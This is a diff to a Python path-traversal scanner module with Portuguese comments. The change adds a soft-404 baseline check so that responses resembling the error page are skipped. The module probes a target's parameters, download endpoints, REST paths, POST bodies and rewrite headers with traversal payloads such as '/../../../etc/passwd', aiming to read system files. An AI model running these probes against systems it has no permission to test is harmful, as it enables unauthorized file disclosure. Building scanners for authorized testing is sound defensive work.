@@ -94,11 +94,25 @@ SENSITIVE_FILES = [
 ZIP_SLIP_INDICATORS = ["file uploaded", "extracted", "imported", "success"]
 
 
-def _test_traversal(target, param, payload, indicator, method):
+def _get_404_baseline(target):
+    """Calcula o tamanho da página de erro 404 (baseline diffing) para evitar Soft-404."""
+    url = f"http://{target}/?file=nao_existo_cascavel_123.txt"
+    try:
+        resp = requests.get(url, timeout=6)
+        return len(resp.text)
+    except Exception:
+        return 0
+
+
+def _test_traversal(target, param, payload, indicator, method, baseline_len):
     """Testa path traversal em um parâmetro."""
     url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
     try:
         resp = requests.get(url, timeout=8)
+        resp_len = len(resp.text)
+        if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+            return None
+
         if resp.status_code == 200 and indicator and indicator in resp.text:
             return {
                 "tipo": "PATH_TRAVERSAL",
@@ -113,7 +127,7 @@ def _test_traversal(target, param, payload, indicator, method):
     return None
 
 
-def _test_download_endpoints(target):
+def _test_download_endpoints(target, baseline_len):
     """Testa acesso direto a arquivos via download endpoints."""
     vulns = []
     for filepath, indicator, label in SENSITIVE_FILES:
@@ -121,6 +135,10 @@ def _test_download_endpoints(target):
             url = f"http://{target}{ep}{urllib.parse.quote(filepath, safe='')}"
             try:
                 resp = requests.get(url, timeout=6)
+                resp_len = len(resp.text)
+                if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+                    continue
+
                 if resp.status_code == 200 and len(resp.text) > 10:
                     if indicator and indicator in resp.text:
                         vulns.append(
@@ -138,7 +156,7 @@ def _test_download_endpoints(target):
     return vulns
 
 
-def _test_api_path_traversal(target):
+def _test_api_path_traversal(target, baseline_len):
     """Testa path traversal em URLs REST-style."""
     vulns = []
     api_paths = [
@@ -152,6 +170,10 @@ def _test_api_path_traversal(target):
     for path in api_paths:
         try:
             resp = requests.get(f"http://{target}{path}", timeout=6)
+            resp_len = len(resp.text)
+            if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+                continue
+
             if LINUX_INDICATOR in resp.text:
                 vulns.append(
                     {
@@ -192,11 +214,15 @@ def _test_zip_slip(target):
     return vulns
 
 
-def _test_post_traversal(target, param):
+def _test_post_traversal(target, param, baseline_len):
     """Testa path traversal via POST body."""
     for payload, indicator, method in TRAVERSAL_PAYLOADS[:5]:
         try:
             resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
+            resp_len = len(resp.text)
+            if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+                continue
+
             if indicator and indicator in resp.text:
                 return {
                     "tipo": "PATH_TRAVERSAL_POST",
@@ -209,7 +235,7 @@ def _test_post_traversal(target, param):
     return None
 
 
-def _test_header_traversal(target):
+def _test_header_traversal(target, baseline_len):
     """Testa path traversal via headers (X-Original-URL, X-Rewrite-URL)."""
     override_headers = [
         ("X-Original-URL", "/../../../etc/passwd"),
@@ -219,6 +245,10 @@ def _test_header_traversal(target):
     for header, value in override_headers:
         try:
             resp = requests.get(f"http://{target}/", headers={header: value}, timeout=6)
+            resp_len = len(resp.text)
+            if baseline_len > 0 and abs(resp_len - baseline_len) / baseline_len < 0.05:
+                continue
+
             if LINUX_INDICATOR in resp.text:
                 return {
                     "tipo": "PATH_TRAVERSAL_HEADER",
@@ -242,31 +272,32 @@ def run(target, ip, open_ports, banners):
     """
     _ = (ip, open_ports, banners)
     vulns = []
+    baseline_len = _get_404_baseline(target)
 
     # 1. Parameter-based traversal
     for param in PARAMS:
         for payload, indicator, method in TRAVERSAL_PAYLOADS:
-            vuln = _test_traversal(target, param, payload, indicator, method)
+            vuln = _test_traversal(target, param, payload, indicator, method, baseline_len)
             if vuln:
                 vulns.append(vuln)
                 break
 
         # POST-based
-        vuln = _test_post_traversal(target, param)
+        vuln = _test_post_traversal(target, param, baseline_len)
         if vuln:
             vulns.append(vuln)
 
     # 2. Download endpoints
-    vulns.extend(_test_download_endpoints(target))
+    vulns.extend(_test_download_endpoints(target, baseline_len))
 
     # 3. API path traversal
-    vulns.extend(_test_api_path_traversal(target))
+    vulns.extend(_test_api_path_traversal(target, baseline_len))
 
     # 4. Zip Slip surface
     vulns.extend(_test_zip_slip(target))
 
     # 5. Header override traversal
-    header_vuln = _test_header_traversal(target)
+    header_vuln = _test_header_traversal(target, baseline_len)
     if header_vuln:
         vulns.append(header_vuln)
 
